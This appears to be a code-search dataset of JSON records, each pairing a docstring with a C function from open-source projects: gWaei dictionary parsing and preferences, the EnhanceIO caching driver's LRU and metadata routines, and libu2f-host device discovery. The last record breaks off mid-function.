{"docstring": "//!\n//! @brief, Retrieve a line from FILE, parse it according to the LwExampleDictionary rules and put the results into the LwResult\n//!\n", "func_signal": "static gint\nlw_exampledictionary_parse_result (LwDictionary *dictionary, LwResult *result, FILE *fd)", "code": "{\n    //Declarations\n    gchar *ptr;\n    gint bytes_read;\n    gint length;\n\n    lw_result_clear (result);\n\n    //Initializations\n    length = bytes_read = 0;\n\n    //Read the next line\n    do {\n      ptr = fgets(result->text, LW_IO_MAX_FGETS_LINE, fd);\n      if (ptr != NULL)\n      {\n        length = strlen(result->text);\n        bytes_read += length;\n      }\n    } while (ptr != NULL && *ptr == '#' && !lw_exampledictionary_is_a (result->text));\n\n    if (ptr == NULL) goto errored;\n    if (!lw_exampledictionary_is_a (result->text)) goto errored;\n\n    //Set the kanji string\n    ptr = result->kanji_start = result->text + 3;\n\n    //Set the romaji string\n    while (*ptr != '\\0' && !g_unichar_isspace (g_utf8_get_char (ptr))) ptr = g_utf8_next_char (ptr);\n    if (*ptr == '\\0') goto errored;\n    *ptr = '\\0';\n    ptr++;\n    result->def_start[0] = ptr;\n\n    //Erase the id number\n    while (*ptr != '\\0' && *ptr != '#') ptr = g_utf8_next_char (ptr);\n    *(ptr++) = '\\0';\n\n    while (*ptr != '\\n') ptr++;\n    *ptr = '\\0';\n\n    //Set the \"furigana\" string\n    ptr = fgets(ptr, LW_IO_MAX_FGETS_LINE - length, fd);\n    if (ptr != NULL && lw_exampledictionary_is_b (ptr))\n    {\n      result->furigana_start = ptr + 3;\n      \n      length = strlen(ptr);\n      bytes_read += length;\n      ptr += length - 1;\n\n      if (*ptr == '\\n') *ptr = '\\0';\n    }\n\nerrored:\n\n    return bytes_read;\n}", "path": "src\\libwaei\\exampledictionary.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Initializes the Mecab analysis engine.\n//!\n", "func_signal": "LwMorphologyEngine*\nlw_morphologyengine_new ()", "code": "{\n    //Declarations\n    static gchar *argv[] = {\"mecab\", NULL};\n    static gboolean message_shown = FALSE;\n    LwMorphologyEngine *engine;\n\n    //Initializations\n    engine = g_new0 (LwMorphologyEngine, 1);\n    if (engine != NULL)\n    {\n      engine->mecab = mecab_new (sizeof(argv)/sizeof(gchar*)-1, argv);\n      g_mutex_init (&engine->mutex);\n    }\n\n    //Error checking\n    if (engine->mecab == NULL) {\n      lw_morphologyengine_free (engine); engine = NULL;\n      if (message_shown == FALSE)\n      {\n        g_message (\"You may not have any mecab dictionaries installed... (Try installing mecab-ipadic?)\");\n        message_shown = TRUE;\n      }\n    }\n    else\n    {\n      message_shown = FALSE;\n    }\n\n    return engine;\n}", "path": "src\\libwaei\\morphology.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Used to free the memory inside of a LwPreferences object.\n//!         Usually lw_preferences_free calls this for you.  It is also used\n//!         in class implimentations that extends LwPreferences.\n//! @param preferences The LwPreferences object to have it's inner memory freed.\n//!\n", "func_signal": "void \nlw_preferences_deinit (LwPreferences *preferences)", "code": "{\n    lw_preferences_free_settings (preferences);\n    g_mutex_clear (&preferences->mutex); \n    if (preferences->backend != NULL) g_object_unref (preferences->backend); preferences->backend = NULL;\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Sets the int to the key in the preferences backend\n//! @param preferences The LwPreferences to fetch the GSettings object matching the schema\n//! @param schema The schema to look for\n//! @param key The key to use to look up the pref inside of the schema\n//! @param request The value to set\n//!\n", "func_signal": "void \nlw_preferences_set_int_by_schema (LwPreferences* preferences, const char* schema, const char *key, const int request)", "code": "{\n    GSettings* settings;\n    \n    settings = lw_preferences_get_settings_object (preferences, schema);\n    if (settings != NULL)\n    {\n      lw_preferences_set_int (settings, key, request);\n    }\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Resets a value in a key\n//! @param preferences The LwPreferences to fetch the GSettings object matching the schema\n//! @param schema A string identifying the schema there the key is\n//! @param key A string identifying the key to reset\n//!\n", "func_signal": "void \nlw_preferences_reset_value_by_schema (LwPreferences* preferences, const char* schema, const char *key)", "code": "{\n    GSettings* settings;\n    \n    settings = lw_preferences_get_settings_object (preferences, schema);\n    if (settings != NULL)\n    {\n      lw_preferences_reset_value (settings, key);\n    }\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Used to remove a listener\n//! @param settings The GSettings object to act on You will have to get it yourself using lw_preferences_get_settings_object\n//! @param id The signalid returned by lw_preferences_add_change_listener\n//!\n", "func_signal": "void \nlw_preferences_remove_change_listener (GSettings *settings, gulong id)", "code": "{\n    if (g_signal_handler_is_connected (G_OBJECT (settings), id))\n    {\n      g_signal_handler_disconnect (G_OBJECT (settings), id);\n    }\n    else\n    {\n    }\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Returns an string from the preference backend \n//! @param output string to copy the pref to\n//! @param settings The GSettings object to act on You will have to get it yourself using lw_preferences_get_settings_object\n//! @param key The key to use to look up the pref\n//! @param n The max characters to copy to output\n//!\n", "func_signal": "void \nlw_preferences_get_string (char *output, GSettings *settings, const char *key, const int n)", "code": "{\n    gchar *value = NULL; \n\n    value = g_settings_get_string (settings, key);\n    g_assert (value != NULL);\n    strncpy(output, value, n);\n    output[n - 1] = '\\0';\n\n    g_free (value);\n    value = NULL;\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Convert string from Mecab's charset to UTF-8.\n//!\n", "func_signal": "static gchar*\nlw_morphologyengine_decode_from_mecab (LwMorphologyEngine *engine, const gchar *word, gint nbytes)", "code": "{\n    const mecab_dictionary_info_t *info = mecab_dictionary_info (engine->mecab);\n    gsize bytes_read, bytes_written;\n    return g_convert (word, nbytes, \"UTF-8\", info->charset, &bytes_read, &bytes_written, NULL);\n}", "path": "src\\libwaei\\morphology.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Used to initialize the memory inside of a new LwPreferences\n//!        object.  Usually lw_preferences_new calls this for you.  It is also \n//!        used in class implimentations that extends LwPreferences.\n//! @param preferences The LwPreferences object to have it's inner memory initialized.\n//!\n", "func_signal": "void \nlw_preferences_init (LwPreferences *preferences, GSettingsBackend *backend)", "code": "{\n    preferences->settingslist = NULL;\n    preferences->backend = backend;\n    g_mutex_init (&preferences->mutex);\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Used to remove a listener\n//! @param preferences The LwPreferences to fetch the GSettings object matching the schema\n//! @param schema A schema of the GSettings object the signal was connected to\n//! @param id The signalid returned by lw_preferences_add_change_listener\n//!\n", "func_signal": "void \nlw_preferences_remove_change_listener_by_schema (LwPreferences *preferences, const char* schema, gulong id)", "code": "{\n    GSettings *settings;\n\n    settings = lw_preferences_get_settings_object (preferences, schema);\n\n    if (settings != NULL)\n    {\n      lw_preferences_remove_change_listener (settings, id);\n    }\n    else\n    {\n    }\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "/*\n * Find a victim block to evict and return it in index.\n */\n", "func_signal": "void\neio_lru_find_reclaim_dbn(struct eio_policy *p_ops,\n\t\t\t index_t start_index, index_t *index)", "code": "{\n\tindex_t lru_rel_index;\n\tstruct eio_lru_cache_set *lru_sets;\n\tstruct eio_lru_cache_block *lru_blk;\n\tstruct cache_c *dmc = p_ops->sp_dmc;\n\tindex_t set;\n\n\tset = start_index / dmc->assoc;\n\tlru_sets = (struct eio_lru_cache_set *)(dmc->sp_cache_set);\n\n\tlru_rel_index = lru_sets[set].lru_head;\n\twhile (lru_rel_index != EIO_LRU_NULL) {\n\t\tlru_blk =\n\t\t\t((struct eio_lru_cache_block *)dmc->sp_cache_blk +\n\t\t\t lru_rel_index + start_index);\n\t\tif (EIO_CACHE_STATE_GET(dmc, (lru_rel_index + start_index)) ==\n\t\t    VALID) {\n\t\t\tEIO_ASSERT((lru_blk - (struct eio_lru_cache_block *)\n\t\t\t\t    dmc->sp_cache_blk) ==\n\t\t\t\t   (lru_rel_index + start_index));\n\t\t\t*index = lru_rel_index + start_index;\n\t\t\teio_reclaim_lru_movetail(dmc, *index, p_ops);\n\t\t\tbreak;\n\t\t}\n\t\tlru_rel_index = lru_blk->lru_next;\n\t}\n\n\treturn;\n}", "path": "Driver\\enhanceio\\eio_lru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * eio_md8_dbn_set\n */\n", "func_signal": "void eio_md8_dbn_set(struct cache_c *dmc, u_int64_t index, sector_t dbn)", "code": "{\n\n\tEIO_ASSERT((dbn & ~EIO_MD8_DBN_MASK) == 0);\n\n\t/* retain \"cache_state\" */\n\tdmc->cache_md8[index].md8_u.u_i_md8 &= ~EIO_MD8_DBN_MASK;\n\tdmc->cache_md8[index].md8_u.u_i_md8 |= dbn;\n\n\t/* XXX excessive debugging */\n\tif (dmc->index_zero < (u_int64_t)dmc->assoc &&  /* sector 0 cached */\n\t    index == dmc->index_zero &&                 /* we're accessing sector 0 */\n\t    dbn != 0)                                   /* we're replacing sector 0 */\n\t\tdmc->index_zero = dmc->assoc;\n}", "path": "Driver\\enhanceio\\eio_mem.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Initialize the lru list */\n", "func_signal": "int lru_init(struct lru_ls **llist, index_t max)", "code": "{\n\tindex_t i = 0;\n\n\tEIO_ASSERT(max > 0);\n\t*llist = vmalloc((sizeof(struct lru_ls) + (max - 1) * sizeof(struct lru_elem)));\n\tif (*llist == NULL)\n\t\treturn -ENOMEM;\n\n\t(*llist)->ll_head = LRU_NULL;\n\t(*llist)->ll_tail = LRU_NULL;\n\t(*llist)->ll_max = max;\n\t(*llist)->ll_size = 0;\n\n\tfor (i = 0; i < max; i++) {\n\t\t(*llist)->ll_elem[i].le_next = LRU_NULL;\n\t\t(*llist)->ll_elem[i].le_prev = LRU_NULL;\n\t\t(*llist)->ll_elem[i].le_key = 0;\n\t}\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Uninitialize the lru list */\n", "func_signal": "void lru_uninit(struct lru_ls *llist)", "code": "{\n\tif (llist)\n\t\tvfree(llist);\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Read the element at the head of the lru */\n", "func_signal": "int lru_read_head(struct lru_ls *llist, index_t *index, u_int64_t *key)", "code": "{\n\tif (!llist || !index || !key)\n\t\treturn -EINVAL;\n\n\t*index = llist->ll_head;\n\tif (llist->ll_head == LRU_NULL) {\n\t\t*index = LRU_NULL;\n\t\t*key = 0;\n\t} else {\n\t\t*index = llist->ll_head;\n\t\t*key = llist->ll_elem[*index].le_key;\n\t}\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * Initialize per set LRU data structures.\n */\n", "func_signal": "int eio_lru_cache_sets_init(struct eio_policy *p_ops)", "code": "{\n\tsector_t order;\n\tint i;\n\tstruct cache_c *dmc = p_ops->sp_dmc;\n\tstruct eio_lru_cache_set *cache_sets;\n\n\torder =\n\t\t(dmc->size >> dmc->consecutive_shift) *\n\t\tsizeof(struct eio_lru_cache_set);\n\n\tdmc->sp_cache_set = vmalloc((size_t)order);\n\tif (dmc->sp_cache_set == NULL)\n\t\treturn -ENOMEM;\n\n\tcache_sets = (struct eio_lru_cache_set *)dmc->sp_cache_set;\n\n\tfor (i = 0; i < (int)(dmc->size >> dmc->consecutive_shift); i++) {\n\t\tcache_sets[i].lru_tail = EIO_LRU_NULL;\n\t\tcache_sets[i].lru_head = EIO_LRU_NULL;\n\t}\n\tpr_info(\"Initialized %d sets in LRU\", i);\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_lru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * eio_invalidate_md\n */\n", "func_signal": "void eio_invalidate_md(struct cache_c *dmc, u_int64_t index)", "code": "{\n\n\tif (EIO_MD8(dmc))\n\t\tdmc->cache_md8[index].md8_u.u_i_md8 = EIO_MD8_INVALID;\n\telse\n\t\tdmc->cache[index].md4_u.u_i_md4 = EIO_MD4_INVALID;\n}", "path": "Driver\\enhanceio\\eio_mem.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * LRU Specific functions\n */\n", "func_signal": "void eio_policy_lru_pushblks(struct eio_policy *p_ops)", "code": "{\n\n\tif (p_ops && p_ops->sp_name == CACHE_REPL_LRU)\n\t\tp_ops->sp_policy.lru->sl_lru_pushblks(p_ops);\n}", "path": "Driver\\enhanceio\\eio_policy.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Remove an entry from the lru list */\n", "func_signal": "int lru_rem(struct lru_ls *llist, index_t index)", "code": "{\n\tif (!llist || (index >= llist->ll_max) || (index == LRU_NULL))\n\t\treturn -EINVAL;\n\n\tif (llist->ll_head == LRU_NULL && llist->ll_tail == LRU_NULL)\n\t\t/*\n\t\t * No element in the list.\n\t\t */\n\t\treturn -EINVAL;\n\n\tif (llist->ll_elem[index].le_prev == LRU_NULL &&\n\t    llist->ll_elem[index].le_next == LRU_NULL &&\n\t    llist->ll_head != index && llist->ll_tail != index)\n\t\t/*\n\t\t * Element not in list.\n\t\t */\n\t\treturn 0;\n\n\tif (llist->ll_elem[index].le_prev != LRU_NULL)\n\t\tllist->ll_elem[llist->ll_elem[index].le_prev].le_next =\n\t\t\tllist->ll_elem[index].le_next;\n\n\tif (llist->ll_elem[index].le_next != LRU_NULL)\n\t\tllist->ll_elem[llist->ll_elem[index].le_next].le_prev =\n\t\t\tllist->ll_elem[index].le_prev;\n\n\tif (llist->ll_head == index)\n\t\tllist->ll_head = llist->ll_elem[index].le_next;\n\n\tif (llist->ll_tail == index)\n\t\tllist->ll_tail = llist->ll_elem[index].le_prev;\n\n\tllist->ll_elem[index].le_prev = LRU_NULL;\n\tllist->ll_elem[index].le_next = LRU_NULL;\n\tEIO_ASSERT(llist->ll_size != 0);\n\tllist->ll_size--;\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * Decrement the reference count of the policy specific module\n * and any other cleanup that is required when an instance of a\n * policy is no longer required.\n */\n", "func_signal": "void eio_put_policy(struct eio_policy *p_ops)", "code": "{\n\n\tif (p_ops == NULL) {\n\t\tpr_err(\"put_policy: Cannot decrement reference\"\t\\\n\t\t       \"count of NULL policy\");\n\t\treturn;\n\t}\n\tp_ops->sp_repl_exit();\n}", "path": "Driver\\enhanceio\\eio_policy.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * Allocate a new instance of eio_policy per dmc\n */\n", "func_signal": "struct eio_policy *eio_lru_instance_init(void)", "code": "{\n\tstruct eio_policy *new_instance;\n\n\tnew_instance = vmalloc(sizeof(struct eio_policy));\n\tif (new_instance == NULL) {\n\t\tpr_err(\"eio_lru_instance_init: vmalloc failed\");\n\t\treturn NULL;\n\t}\n\n\t/* Initialize the LRU specific functions and variables */\n\tnew_instance->sp_name = CACHE_REPL_LRU;\n\tnew_instance->sp_policy.lru = &eio_lru;\n\tnew_instance->sp_repl_init = eio_lru_init;\n\tnew_instance->sp_repl_exit = eio_lru_exit;\n\tnew_instance->sp_repl_sets_init = eio_lru_cache_sets_init;\n\tnew_instance->sp_repl_blk_init = eio_lru_cache_blk_init;\n\tnew_instance->sp_find_reclaim_dbn = eio_lru_find_reclaim_dbn;\n\tnew_instance->sp_clean_set = eio_lru_clean_set;\n\tnew_instance->sp_dmc = NULL;\n\n\ttry_module_get(THIS_MODULE);\n\n\tpr_info(\"eio_lru_instance_init: created new instance of LRU\");\n\n\treturn new_instance;\n}", "path": "Driver\\enhanceio\\eio_lru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Add a new entry to lru list */\n", "func_signal": "int lru_add(struct lru_ls *llist, index_t index, u_int64_t key)", "code": "{\n\tif (!llist || (index >= llist->ll_max))\n\t\treturn -EINVAL;\n\n\tllist->ll_elem[index].le_prev = llist->ll_tail;\n\tllist->ll_elem[index].le_next = LRU_NULL;\n\tllist->ll_elem[index].le_key = key;\n\n\tif (llist->ll_tail != LRU_NULL)\n\t\tllist->ll_elem[llist->ll_tail].le_next = index;\n\telse {\n\t\tEIO_ASSERT(llist->ll_head == LRU_NULL);\n\t\tllist->ll_head = index;\n\t}\n\tllist->ll_tail = index;\n\tllist->ll_size++;\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Remove the element at the head of the lru */\n", "func_signal": "int lru_rem_head(struct lru_ls *llist, index_t *index, u_int64_t *key)", "code": "{\n\tif (!llist || !index || !key)\n\t\treturn -EINVAL;\n\n\t*index = llist->ll_head;\n\tif (llist->ll_head == LRU_NULL) {\n\t\t*index = LRU_NULL;\n\t\t*key = 0;\n\t} else {\n\t\t*index = llist->ll_head;\n\t\t*key = llist->ll_elem[*index].le_key;\n\t\tlru_rem(llist, *index);\n\t}\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * eio_shrink_dbn\n *\n * Shrink a 5-byte \"dbn\" into a 3-byte \"dbn\" by eliminating 16 lower bits\n * of the set number this \"dbn\" belongs to.\n */\n", "func_signal": "unsigned int eio_shrink_dbn(struct cache_c *dmc, sector_t dbn)", "code": "{\n\tu_int32_t dbn_24;\n\tsector_t lsb;\n\tsector_t wrapped;\n\tsector_t msb;\n\tsector_t set_number;\n\n\tEIO_ASSERT(!EIO_MD8(dmc));\n\tif (unlikely(dbn == 0))\n\t\treturn 0;\n\n\tlsb = dbn & SECTORS_PER_SET_MASK;\n\tEIO_DBN_TO_SET(dmc, dbn, set_number, wrapped);\n\tmsb = dbn >> (dmc->num_sets_bits + SECTORS_PER_SET_SHIFT);\n\tdbn_24 =\n\t\t(unsigned int)(lsb | (wrapped << SECTORS_PER_SET_SHIFT) |\n\t\t\t       (msb << (SECTORS_PER_SET_SHIFT + 1)));\n\n\treturn dbn_24;\n}", "path": "Driver\\enhanceio\\eio_mem.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * eio_expand_dbn\n *\n * Expand a 3-byte \"dbn\" into a 5-byte \"dbn\" by adding 16 lower bits\n * of the set number this \"dbn\" belongs to.\n */\n", "func_signal": "sector_t eio_expand_dbn(struct cache_c *dmc, u_int64_t index)", "code": "{\n\tu_int32_t dbn_24;\n\tu_int64_t set_number;\n\tsector_t lsb;\n\tsector_t msb;\n\tsector_t dbn_40;\n\n\tEIO_ASSERT(!EIO_MD8(dmc));\n\t/*\n\t * Expanding \"dbn\" zero?\n\t */\n\tif (index == dmc->index_zero &&\n\t    dmc->index_zero < (u_int64_t)dmc->assoc)\n\t\treturn 0;\n\n\tdbn_24 = dmc->cache[index].md4_u.u_i_md4 & EIO_MD4_DBN_MASK;\n\tif (dbn_24 == 0 && EIO_CACHE_STATE_GET(dmc, index) == INVALID)\n\t\treturn (sector_t)0;\n\n\tset_number = EIO_DIV(index, dmc->assoc);\n\tlsb = dbn_24 & SECTORS_PER_SET_MASK;\n\tmsb = dbn_24 >> (SECTORS_PER_SET_SHIFT + 1);    /* 1 for wrapped */\n\t/* had we wrapped? */\n\tif ((dbn_24 & SECTORS_PER_SET) != 0) {\n\t\tdbn_40 = msb << (dmc->num_sets_bits + SECTORS_PER_SET_SHIFT);\n\t\tdbn_40 |= (set_number + dmc->num_sets) << SECTORS_PER_SET_SHIFT;\n\t\tdbn_40 |= lsb;\n\t} else {\n\t\tdbn_40 = msb << (dmc->num_sets_bits + SECTORS_PER_SET_SHIFT);\n\t\tdbn_40 |= set_number << SECTORS_PER_SET_SHIFT;\n\t\tdbn_40 |= lsb;\n\t}\n\tEIO_ASSERT(unlikely(dbn_40 < EIO_MAX_SECTOR));\n\n\treturn (sector_t)dbn_40;\n}", "path": "Driver\\enhanceio\\eio_mem.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * eio_md4_dbn_set\n */\n", "func_signal": "void eio_md4_dbn_set(struct cache_c *dmc, u_int64_t index, u_int32_t dbn_24)", "code": "{\n\n\tEIO_ASSERT((dbn_24 & ~EIO_MD4_DBN_MASK) == 0);\n\n\t/* retain \"cache_state\" */\n\tdmc->cache[index].md4_u.u_i_md4 &= ~EIO_MD4_DBN_MASK;\n\tdmc->cache[index].md4_u.u_i_md4 |= dbn_24;\n\n\t/* XXX excessive debugging */\n\tif (dmc->index_zero < (u_int64_t)dmc->assoc &&  /* sector 0 cached */\n\t    index == dmc->index_zero &&                 /* we're accessing sector 0 */\n\t    dbn_24 != 0)                                /* we're replacing sector 0 */\n\t\tdmc->index_zero = dmc->assoc;\n}", "path": "Driver\\enhanceio\\eio_mem.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/* Move up the given lru element */\n", "func_signal": "int lru_touch(struct lru_ls *llist, index_t index, u_int64_t key)", "code": "{\n\tif (!llist || (index >= llist->ll_max))\n\t\treturn -EINVAL;\n\n\tif (llist->ll_tail == index)\n\t\tllist->ll_elem[index].le_key = key;\n\telse {\n\t\tlru_rem(llist, index);\n\t\tlru_add(llist, index, key);\n\t}\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_setlru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * eio_mem_init\n */\n", "func_signal": "int eio_mem_init(struct cache_c *dmc)", "code": "{\n\tu_int32_t lsb_bits;\n\tu_int32_t msb_bits_24;  /* most significant bits in shrunk dbn */\n\tu_int64_t max_dbn;\n\tu_int64_t num_sets_64;\n\n\t/*\n\t * Sanity check the number of sets.\n\t */\n\tnum_sets_64 = EIO_DIV(dmc->size, dmc->assoc);\n\tif (num_sets_64 > UINT_MAX) {\n\t\tpr_err(\"Number of cache sets (%lu) greater than maximum\" \\\n\t\t       \"allowed (%u)\",\n\t\t       (long unsigned int)num_sets_64, UINT_MAX);\n\t\treturn -1;\n\t}\n\n\t/*\n\t * Find the number of bits required to encode the set number and\n\t * its corresponding mask value.\n\t */\n\tdmc->num_sets = (u_int32_t)num_sets_64;\n\tfor (dmc->num_sets_bits = 0; (dmc->num_sets >> dmc->num_sets_bits);\n\t\tdmc->num_sets_bits++);\n\n\tdmc->num_sets_mask = ULLONG_MAX >> (64 - dmc->num_sets_bits);\n\n\t/*\n\t * If we don't have at least 16 bits to save,\n\t * we can't use small metadata.\n\t */\n\tif (dmc->num_sets_bits < 16) {\n\t\tdmc->cache_flags |= CACHE_FLAGS_MD8;\n\t\tpr_info(\"Not enough sets to use small metadata\");\n\t\treturn 1;\n\t}\n\n\t/*\n\t * Now compute the largest sector number that we can shrink; then see\n\t * if the source volume is smaller.\n\t */\n\tlsb_bits = dmc->consecutive_shift + dmc->block_shift;\n\tmsb_bits_24 = 24 - 1 - lsb_bits;        /* 1 for wrapped bit */\n\tmax_dbn =\n\t\t((u_int64_t)1) << (msb_bits_24 + dmc->num_sets_bits + lsb_bits);\n\tif (eio_to_sector(eio_get_device_size(dmc->disk_dev)) > max_dbn) {\n\t\tdmc->cache_flags |= CACHE_FLAGS_MD8;\n\t\tpr_info(\"Source volume too big to use small metadata\");\n\t\treturn 1;\n\t}\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_mem.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * Initialize per block LRU data structures\n */\n", "func_signal": "int eio_lru_cache_blk_init(struct eio_policy *p_ops)", "code": "{\n\tsector_t order;\n\tstruct cache_c *dmc = p_ops->sp_dmc;\n\n\torder = dmc->size * sizeof(struct eio_lru_cache_block);\n\n\tdmc->sp_cache_blk = vmalloc((size_t)order);\n\tif (dmc->sp_cache_blk == NULL)\n\t\treturn -ENOMEM;\n\n\treturn 0;\n}", "path": "Driver\\enhanceio\\eio_lru.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/*\n * Wrappers for policy specific functions. These default to nothing if the\n * default policy is being used.\n */\n", "func_signal": "int eio_repl_sets_init(struct eio_policy *p_ops)", "code": "{\n\n\treturn (p_ops &&\n\t\tp_ops->sp_repl_sets_init) ? p_ops->sp_repl_sets_init(p_ops) : 0;\n}", "path": "Driver\\enhanceio\\eio_policy.c", "repo_name": "stec-inc/EnhanceIO", "stars": 417, "license": "other", "language": "c", "size": 1281}
{"docstring": "/**\n * u2fh_strerror_name:\n * @err: error code\n *\n * Convert return code to human readable string representing the error\n * code symbol itself.  For example, u2fh_strerror_name(%U2FH_OK)\n * returns the string \"U2FH_OK\".\n *\n * This string can be used to output a diagnostic message to the user.\n *\n * This function is one of few in the library that can be used without\n * a successful call to u2fh_global_init().\n *\n * Return value: Returns a pointer to a statically allocated string\n *   containing a string version of the error code @err, or NULL if\n *   the error code is not known.\n **/\n", "func_signal": "const char *\nu2fh_strerror_name (int err)", "code": "{\n  if (-err < 0 || -err >= (int) (sizeof (errors) / sizeof (errors[0])))\n    return NULL;\n\n  return errors[-err].name;\n}", "path": "u2f-host\\error.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_devs_discover:\n * @devs: device handle, from u2fh_devs_init().\n * @max_index: will on return be set to the maximum index, may be NULL; if\n *   there is 1 device this will be 0, if there are 2 devices this\n *   will be 1, and so on.\n *\n * Discover and open new devices.  This function can safely be called\n * several times and will free resources associated with unplugged\n * devices and open new.\n *\n * Returns: On success, %U2FH_OK (integer 0) is returned, when no U2F\n *   device could be found %U2FH_NO_U2F_DEVICE is returned, or another\n *   #u2fh_rc error code.\n */\n", "func_signal": "u2fh_rc\nu2fh_devs_discover (u2fh_devs * devs, unsigned *max_index)", "code": "{\n  struct hid_device_info *di, *cur_dev;\n  u2fh_rc res = U2FH_NO_U2F_DEVICE;\n  struct u2fdevice *dev;\n\n  di = hid_enumerate (0, 0);\n  for (cur_dev = di; cur_dev; cur_dev = cur_dev->next)\n    {\n      int found = 0;\n      unsigned short usage_page = 0, usage = 0;\n\n      /* check if we already opened this device */\n      for (dev = devs->first; dev != NULL; dev = dev->next)\n\t{\n\t  if (strcmp (dev->device_path, cur_dev->path) == 0)\n\t    {\n\t      if (ping_device (devs, dev->id) == U2FH_OK)\n\t\t{\n\t\t  found = 1;\n\t\t  res = U2FH_OK;\n\t\t}\n\t      else\n\t\t{\n\t\t  if (debug)\n\t\t    {\n\t\t      fprintf (stderr, \"Device %s failed ping, dead.\\n\",\n\t\t\t       dev->device_path);\n\t\t    }\n\t\t  close_device (devs, dev);\n\t\t}\n\t      break;\n\t    }\n\t}\n      if (found)\n\t{\n\t  continue;\n\t}\n\n      get_usages (cur_dev, &usage_page, &usage);\n      if (usage_page == FIDO_USAGE_PAGE && usage == FIDO_USAGE_U2FHID)\n\t{\n\t  dev = new_device (devs);\n\t  if (dev == NULL)\n\t    {\n\t      res = U2FH_MEMORY_ERROR;\n\t      goto out;\n\t    }\n\t  dev->devh = hid_open_path (cur_dev->path);\n\t  if (dev->devh != NULL)\n\t    {\n\t      dev->device_path = strdup (cur_dev->path);\n\t      if (dev->device_path == NULL)\n\t\t{\n\t\t  close_device (devs, dev);\n\t\t  goto out;\n\t\t}\n\t      if (init_device (devs, dev) == U2FH_OK)\n\t\t{\n\t\t  if (cur_dev->product_string)\n\t\t    {\n\t\t      size_t len =\n\t\t\twcstombs (NULL, cur_dev->product_string, 0);\n\t\t      dev->device_string = malloc (len + 1);\n\t\t      if (dev->device_string == NULL)\n\t\t\t{\n\t\t\t  close_device (devs, dev);\n\t\t\t  goto out;\n\t\t\t}\n\t\t      memset (dev->device_string, 0, len + 1);\n\t\t      wcstombs (dev->device_string, 